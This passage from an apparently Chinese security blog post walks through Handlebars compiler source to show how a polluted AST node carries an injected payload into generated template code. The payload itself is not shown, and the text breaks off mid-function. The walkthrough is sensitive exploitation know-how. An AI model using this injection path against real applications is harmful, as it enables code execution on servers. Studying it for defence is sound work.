<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">node</span>) &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[node.<span class="property">type</span>]) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + node.<span class="property">type</span>, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">unshift</span>(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[node.<span class="property">type</span>](node); <span class="comment">// 提取AST对应的type并调用该构造函数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>第一次<code>node.type</code>被污染为<code>program</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">Program</span>: <span class="keyword">function</span> <span class="title function_">Program</span>(<span class="params">program</span>) &#123; <span class="comment">// 利用Program类来自定义类</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">unshift</span>(program.<span class="property">blockParams</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> body = program.<span class="property">body</span>, <span class="comment">// 通过污染body插入我们的恶意代码</span></span><br><span class="line">        bodyLength = body.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bodyLength; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(body[i]); <span class="comment">// 提取我们的body继续调用accept进行解析</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isSimple</span> = bodyLength === <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = program.<span class="property">blockParams</span> ? program.<span class="property">blockParams</span>.<span class="property">length</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>第二次<code>node.type</code>为自定义的<code>MustacheStatement</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">MustacheStatement</span>: <span class="keyword">function</span> <span class="title function_">MustacheStatement</span>(<span class="params">mustache</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title class_">SubExpression</span>(mustache); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mustache.<span class="property">escaped</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">noEscape</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;appendEscaped&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;append&#x27;</span>); <span class="comment">// 如果没有设置escaped的话就进行append操作</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="title class_">SubExpression</span>: <span class="keyword">function</span> <span class="title function_">SubExpression</span>(<span class="params">sexpr</span>) &#123;</span><br><span class="line">    <span class="title function_">transformLiteralToPath</span>(sexpr);</span><br><span class="line">    <span class="keyword">var</span> type = <span class="variable language_">this</span>.<span class="title function_">classifySexpr</span>(sexpr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type === <span class="string">&#x27;simple&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">simpleSexpr</span>(sexpr);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">&#x27;helper&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">helperSexpr</span>(sexpr); <span class="comment">// 2</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">ambiguousSexpr</span>(sexpr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">helperSexpr</span>: <span class="keyword">function</span> <span class="title function_">helperSexpr</span>(<span class="params">sexpr, program, inverse</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> params = <span class="variable language_">this</span>.<span class="title function_">setupFullMustacheParams</span>(sexpr, program, inverse), <span class="comment">// 3</span></span><br><span class="line">        path = sexpr.<span class="property">path</span>,</span><br><span class="line">        name = path.<span class="property">parts</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">knownHelpers</span>[name]) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;invokeKnownHelper&#x27;</span>, params.<span class="property">length</span>, name);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">knownHelpersOnly</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;You specified knownHelpersOnly, but used the unknown helper &#x27;</span> + name, sexpr);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      path.<span class="property">strict</span> = <span class="literal">true</span>;</span><br><span class="line">      path.<span class="property">falsy</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(path);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;invokeHelper&#x27;</span>, params.<span class="property">length</span>, path.<span class="property">original</span>, _ast2[<span class="string">&#x27;default&#x27;</span>].<span class="property">helpers</span>.<span class="title function_">simpleId</span>(path));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">setupFullMustacheParams</span>: <span class="keyword">function</span> <span class="title function_">setupFullMustacheParams</span>(<span class="params">sexpr, program, inverse, omitEmpty</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> params = sexpr.<span class="property">params</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pushParams</span>(params); <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushProgram&#x27;</span>, program);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushProgram&#x27;</span>, inverse);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sexpr.<span class="property">hash</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(sexpr.<span class="property">hash</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;emptyHash&#x27;</span>, omitEmpty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> params;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">pushParams</span>: <span class="keyword">function</span> <span class="title function_">pushParams</span>(<span class="params">params</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = params.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">pushParam</span>(params[i]); <span class="comment">// 5</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">      </span><br><span class="line">  <span class="attr">pushParam</span>: <span class="keyword">function</span> <span class="title function_">pushParam</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> value = val.<span class="property">value</span> != <span class="literal">null</span> ? val.<span class="property">value</span> : val.<span class="property">original</span> || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">stringParams</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (value.<span class="property">replace</span>) &#123;</span><br><span class="line">        value = value.<span class="title function_">replace</span>(<span class="regexp">/^(\.?\.\/)*/g</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (val.<span class="property">depth</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">addDepth</span>(val.<span class="property">depth</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;getContext&#x27;</span>, val.<span class="property">depth</span> || <span class="number">0</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushStringParam&#x27;</span>, value, val.<span class="property">type</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (val.<span class="property">type</span> === <span class="string">&#x27;SubExpression&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// SubExpressions get evaluated and passed in</span></span><br><span class="line">        <span class="comment">// in string params mode.</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">accept</span>(val);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">trackIds</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> blockParamIndex = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">if</span> (val.<span class="property">parts</span> &amp;&amp; !_ast2[<span class="string">&#x27;default&#x27;</span>].<span class="property">helpers</span>.<span class="title function_">scopedId</span>(val) &amp;&amp; !val.<span class="property">depth</span>) &#123;</span><br><span class="line">          blockParamIndex = <span class="variable language_">this</span>.<span class="title function_">blockParamIndex</span>(val.<span class="property">parts</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (blockParamIndex) &#123;</span><br><span class="line">          <span class="keyword">var</span> blockParamChild = val.<span class="property">parts</span>.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushId&#x27;</span>, <span class="string">&#x27;BlockParam&#x27;</span>, blockParamIndex, blockParamChild);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          value = val.<span class="property">original</span> || value;</span><br><span class="line">          <span class="keyword">if</span> (value.<span class="property">replace</span>) &#123;</span><br><span class="line">            value = value.<span class="title function_">replace</span>(<span class="regexp">/^this(?:\.|$)/</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/^\.\//</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/^\.$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushId&#x27;</span>, val.<span class="property">type</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">accept</span>(val); <span class="comment">// 6 很巧妙地将我们的payload再次传入accept函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>第三次<code>node.type</code>为<code>NumberLiteral</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">StringLiteral</span>: <span class="keyword">function</span> <span class="title function_">StringLiteral</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushString&#x27;</span>, string.<span class="property">value</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">NumberLiteral</span>: <span class="keyword">function</span> <span class="title function_">NumberLiteral</span>(<span class="params">number</span>) &#123; </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, number.<span class="property">value</span>); <span class="comment">// 将我们的payload识别为Literal而直接转进构造函数</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">BooleanLiteral</span>: <span class="keyword">function</span> <span class="title function_">BooleanLiteral</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, bool.<span class="property">value</span>); </span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">UndefinedLiteral</span>: <span class="keyword">function</span> <span class="title function_">UndefinedLiteral</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>后面还有一系列对<code>opcode</code>的操作，均为<code>MustacheStatement</code>语法树的编译过程，下图是编译好<code>MustacheStatement</code>语法树之后<code>opcodes</code>的全部操作，而我们的payload就被注入了第一个</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021092516367021e78643cf9a68f7c7.png" alt="image-20210925113821867" style="zoom:80%;" />

<h4 id="编译模板"><a href="#编译模板" class="headerlink" title="编译模板"></a>编译模板</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), </span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options),</span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>); <span class="comment">// 将我们的环境变量传进去来编译templateSpec</span></span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">compile</span>: <span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">environment, options, context, asObject</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">environment</span> = environment;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stringParams</span> = <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">stringParams</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">trackIds</span> = <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">trackIds</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">precompile</span> = !asObject;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">name</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isChild</span> = !!context;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">context</span> = context || &#123;</span><br><span class="line">      <span class="attr">decorators</span>: [],</span><br><span class="line">      <span class="attr">programs</span>: [],</span><br><span class="line">      <span class="attr">environments</span>: []</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">preamble</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stackSlot</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stackVars</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">aliases</span> = &#123;&#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">registers</span> = &#123; <span class="attr">list</span>: [] &#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">hashes</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">compileStack</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">inlineStack</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">compileChildren</span>(environment, options);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">useDepths</span> = <span class="variable language_">this</span>.<span class="property">useDepths</span> || environment.<span class="property">useDepths</span> || environment.<span class="property">useDecorators</span> || <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compat</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">useBlockParams</span> = <span class="variable language_">this</span>.<span class="property">useBlockParams</span> || environment.<span class="property">useBlockParams</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> opcodes = environment.<span class="property">opcodes</span>,</span><br><span class="line">        opcode = <span class="literal">undefined</span>,</span><br><span class="line">        firstLoc = <span class="literal">undefined</span>,</span><br><span class="line">        i = <span class="literal">undefined</span>,</span><br><span class="line">        l = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, l = opcodes.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">      opcode = opcodes[i];</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span> = opcode.<span class="property">loc</span>;</span><br><span class="line">      firstLoc = firstLoc || opcode.<span class="property">loc</span>;</span><br><span class="line">      <span class="variable language_">this</span>[opcode.<span class="property">opcode</span>].<span class="title function_">apply</span>(<span class="variable language_">this</span>, opcode.<span class="property">args</span>); <span class="comment">// 这里就是使用我们opcode的操作，然后会把结果存到this.source.SourceNode中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flush any trailing content that might be pending.</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span> = firstLoc;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pushSource</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* istanbul ignore next */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">stackSlot</span> || <span class="variable language_">this</span>.<span class="property">inlineStack</span>.<span class="property">length</span> || <span class="variable language_">this</span>.<span class="property">compileStack</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Compile completed with content left on stack&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">useDecorators</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">prepend</span>([<span class="string">&#x27;var decorators = container.decorators, &#x27;</span>, <span class="variable language_">this</span>.<span class="title function_">lookupPropertyFunctionVarDeclaration</span>(), <span class="string">&#x27;;\n&#x27;</span>]);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">push</span>(<span class="string">&#x27;return fn;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (asObject) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span> = <span class="title class_">Function</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, [<span class="string">&#x27;fn&#x27;</span>, <span class="string">&#x27;props&#x27;</span>, <span class="string">&#x27;container&#x27;</span>, <span class="string">&#x27;depth0&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;blockParams&#x27;</span>, <span class="string">&#x27;depths&#x27;</span>, <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">merge</span>()]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">prepend</span>(<span class="string">&#x27;function(fn, props, container, depth0, data, blockParams, depths) &#123;\n&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">push</span>(<span class="string">&#x27;&#125;\n&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span> = <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">merge</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">decorators</span> = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fn = <span class="variable language_">this</span>.<span class="title function_">createFunctionContext</span>(asObject); <span class="comment">// 创建模板的函数体</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isChild</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> ret = &#123;</span><br><span class="line">        <span class="attr">compiler</span>: <span class="variable language_">this</span>.<span class="title function_">compilerInfo</span>(),</span><br><span class="line">        <span class="attr">main</span>: fn</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">decorators</span>) &#123;</span><br><span class="line">        ret.<span class="property">main_d</span> = <span class="variable language_">this</span>.<span class="property">decorators</span>; <span class="comment">// eslint-disable-line camelcase</span></span><br><span class="line">        ret.<span class="property">useDecorators</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> _context = <span class="variable language_">this</span>.<span class="property">context</span>;</span><br><span class="line">      <span class="keyword">var</span> programs = _context.<span class="property">programs</span>;</span><br><span class="line">      <span class="keyword">var</span> decorators = _context.<span class="property">decorators</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>, l = programs.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (programs[i]) &#123;</span><br><span class="line">          ret[i] = programs[i];</span><br><span class="line">          <span class="keyword">if</span> (decorators[i]) &#123;</span><br><span class="line">            ret[i + <span class="string">&#x27;_d&#x27;</span>] = decorators[i];</span><br><span class="line">            ret.<span class="property">useDecorators</span> = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">usePartial</span>) &#123;</span><br><span class="line">        ret.<span class="property">usePartial</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        ret.<span class="property">useData</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useDepths</span>) &#123;</span><br><span class="line">        ret.<span class="property">useDepths</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useBlockParams</span>) &#123;</span><br><span class="line">        ret.<span class="property">useBlockParams</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compat</span>) &#123;</span><br><span class="line">        ret.<span class="property">compat</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!asObject) &#123;</span><br><span class="line">        ret.<span class="property">compiler</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(ret.<span class="property">compiler</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span> = &#123; <span class="attr">start</span>: &#123; <span class="attr">line</span>: <span class="number">1</span>, <span class="attr">column</span>: <span class="number">0</span> &#125; &#125;;</span><br><span class="line">        ret = <span class="variable language_">this</span>.<span class="title function_">objectLiteral</span>(ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (options.<span class="property">srcName</span>) &#123;</span><br><span class="line">          ret = ret.<span class="title function_">toStringWithSourceMap</span>(&#123; <span class="attr">file</span>: options.<span class="property">destName</span> &#125;);</span><br><span class="line">          ret.<span class="property">map</span> = ret.<span class="property">map</span> &amp;&amp; ret.<span class="property">map</span>.<span class="title function_">toString</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          ret = ret.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret.<span class="property">compilerOptions</span> = <span class="variable language_">this</span>.<span class="property">options</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>执行<code>opcode</code>中<code>pushLiteral</code>的具体实现流程</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// [pushLiteral]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// On stack, before: ...</span></span><br><span class="line">  <span class="comment">// On stack, after: value, ...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Pushes a value onto the stack. This operation prevents</span></span><br><span class="line">  <span class="comment">// the compiler from creating a temporary variable to hold</span></span><br><span class="line">  <span class="comment">// it.  </span></span><br><span class="line">  <span class="attr">pushLiteral</span>: <span class="keyword">function</span> <span class="title function_">pushLiteral</span>(<span class="params">value</span>) &#123; <span class="comment">// 注释也已经很清楚了</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pushStackLiteral</span>(value); </span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="attr">pushStackLiteral</span>: <span class="keyword">function</span> <span class="title function_">pushStackLiteral</span>(<span class="params">item</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Literal</span>(item));</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Literal</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  	<span class="variable language_">this</span>.<span class="property">value</span> = value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="attr">push</span>: <span class="keyword">function</span> <span class="title function_">push</span>(<span class="params">expr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(expr <span class="keyword">instanceof</span> <span class="title class_">Literal</span>)) &#123;</span><br><span class="line">      expr = <span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">wrap</span>(expr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">inlineStack</span>.<span class="title function_">push</span>(expr);</span><br><span class="line">    <span class="keyword">return</span> expr;</span><br><span class="line">  